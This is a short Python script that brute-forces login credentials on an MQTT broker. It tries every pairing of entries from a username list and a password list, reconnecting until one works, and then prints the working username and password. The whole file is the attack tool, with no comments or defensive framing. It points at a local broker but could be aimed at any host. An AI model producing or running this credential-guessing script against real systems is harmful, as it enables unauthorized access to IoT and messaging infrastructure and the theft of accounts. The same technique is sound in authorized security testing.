import itertools
import time

import paho.mqtt.client as mqtt


def on_disconnect(client, userdata, rc):
    client.loop_stop()


def main():
    client = mqtt.Client()
    client.username_pw_set("", "")
    client.on_disconnect = on_disconnect
    client.connect('localhost', 1883, 60)
    client.loop_start()

    username_file = open('usernames.txt', 'r')
    username_list = username_file.read().split()
    password_file = open('passwords.txt', 'r')
    password_list = password_file.read().split()

    dict_list = list(itertools.product(username_list, password_list))

    breached = 0
    i = 0
    while not breached:
        if client.is_connected():
            breached = 1
            print("Success")
            print('Username: ' + str(dict_list[i - 1][0]) + '\nPassword: ' + str(dict_list[i - 1][1]))
        else:
            client.loop_stop()
            client.username_pw_set(dict_list[i][0], dict_list[i][1])
            client.reconnect()
            client.loop_start()
            i += 1
            time.sleep(0.0000001)

    client.disconnect()


if __name__ == '__main__':
    main()